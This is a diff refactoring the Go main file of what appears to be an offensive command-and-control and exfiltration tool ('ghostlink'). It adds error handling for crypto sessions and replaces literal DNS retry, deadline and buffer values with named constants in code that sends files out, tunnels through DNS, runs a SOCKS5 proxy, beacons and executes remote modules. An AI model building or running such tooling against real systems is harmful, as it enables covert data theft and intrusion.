@@ -5,14 +5,12 @@ import (
 	"encoding/base64"
 	"flag"
 	"fmt"
-	"io"
 	"log"
 	"net"
 	"os"
 	"os/signal"
 	"path/filepath"
 	"strings"
-	"sync/atomic"
 	"syscall"
 	"time"
 
@@ -27,6 +25,12 @@ import (
 	"github.com/byjanke/ghostlink/pkg/protocol"
 	"github.com/byjanke/ghostlink/pkg/shell"
 	"github.com/byjanke/ghostlink/pkg/socks"
+)
+
+const (
+	maxRetryAttempts = 5
+	dnsReadDeadline  = 3 * time.Second
+	dnsRecvBuffer    = 100
 )
 
 func main() {
@@ -201,7 +205,12 @@ func runExfilSingle(filePath, chType, addr, key string, ecdhe bool, domain, fron
 
 	var cryptoSes *crypto.Session
 	if sessionKey != nil {
-		cryptoSes, _ = crypto.NewSession(sessionKey)
+		var err error
+		cryptoSes, err = crypto.NewSession(sessionKey)
+		if err != nil {
+			fmt.Printf("[-] crypto session: %v\n", err)
+			cryptoSes = nil
+		}
 	}
 
 	payload := fmt.Sprintf("%s\x00%d\x00%s", filepath.Base(entry.Path), entry.Size, string(entry.Content))
@@ -262,7 +271,12 @@ func runExfilGlob(pattern, filter string, maxSize int64, chType, addr, key strin
 
 	var cryptoSes *crypto.Session
 	if sessionKey != nil {
-		cryptoSes, _ = crypto.NewSession(sessionKey)
+		var err error
+		cryptoSes, err = crypto.NewSession(sessionKey)
+		if err != nil {
+			fmt.Printf("[-] crypto session: %v\n", err)
+			cryptoSes = nil
+		}
 	}
 
 	payload := exfil.EncodeFileList(files)
@@ -315,7 +329,12 @@ func runMultiPathExfil(channelsStr, filePath, addr, key string, ecdhe, fec bool)
 		var ses *crypto.Session
 		if key != "" {
 			h := sha256.Sum256([]byte(key))
-			ses, _ = crypto.NewSession(h[:])
+			var err error
+			ses, err = crypto.NewSession(h[:])
+			if err != nil {
+				fmt.Printf("[-] crypto session: %v\n", err)
+				ses = nil
+			}
 		}
 		sender.AddPath(ch, ses)
 		fmt.Printf("[+] %s connected\n", t)
@@ -479,7 +498,7 @@ func connectAuthDNS(domain, key string, ecdhe bool, fallbackAddr string) (channe
 		conn:     conn.(*net.UDPConn),
 		domain:   domain,
 		resolver: resolver,
-		recvCh:   make(chan []byte, 100),
+		recvCh:   make(chan []byte, dnsRecvBuffer),
 	}
 
 	fmt.Println("[*] tunneling through DNS hierarchy")
@@ -512,18 +531,18 @@ func (c *authDNSClientChannel) Send(data []byte) error {
 }
 
 func (c *authDNSClientChannel) Recv() ([]byte, error) {
-	for attempt := 0; attempt < 5; attempt++ {
+	for attempt := 0; attempt < maxRetryAttempts; attempt++ {
 		poll := buildAuthDNSQuery([]byte{}, c.domain)
 		_, err := c.conn.Write(poll)
 		if err != nil {
 			return nil, err
 		}
 
-		c.conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+		c.conn.SetReadDeadline(time.Now().Add(dnsReadDeadline))
 		buf := make([]byte, 1500)
 		n, _, err := c.conn.ReadFromUDP(buf)
 		if err != nil {
-			if attempt < 4 {
+			if attempt < maxRetryAttempts-1 {
 				continue
 			}
 			return nil, err
@@ -866,7 +885,7 @@ func resolveDNS(server, domain string, qtype uint16) ([]string, error) {
 		return nil, fmt.Errorf("write: %w", err)
 	}
 
-	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	conn.SetReadDeadline(time.Now().Add(dnsReadDeadline))
 	buf := make([]byte, 1500)
 	n, err := conn.Read(buf)
 	if err != nil {
@@ -1032,8 +1051,6 @@ func runSocks(ch channel.Channel, cryptoSes *crypto.Session, port string) {
 	listenAddr := "0.0.0.0:" + port
 	fmt.Printf("[*] SOCKS5 proxy on %s\n", listenAddr)
 
-	var connIDCounter uint32
-
 	tun := socks.NewTunnel(listenAddr)
 	tun.SetCallbacks(
 		func(connID uint32, addr string) {
@@ -1086,8 +1103,6 @@ func runSocks(ch channel.Channel, cryptoSes *crypto.Session, port string) {
 	<-sigCh
 	tun.Close()
 
-	_ = connIDCounter
-	_ = atomic.AddUint32
 }
 
 func runBeacon(ch channel.Channel, cryptoSes *crypto.Session, profile string) {
@@ -1183,4 +1198,4 @@ func handleModuleExec(ch channel.Channel, cryptoSes *crypto.Session, reg *module
 	sendMsg(ch, cryptoSes, resp)
 }
 
-var _ = io.Discard
+
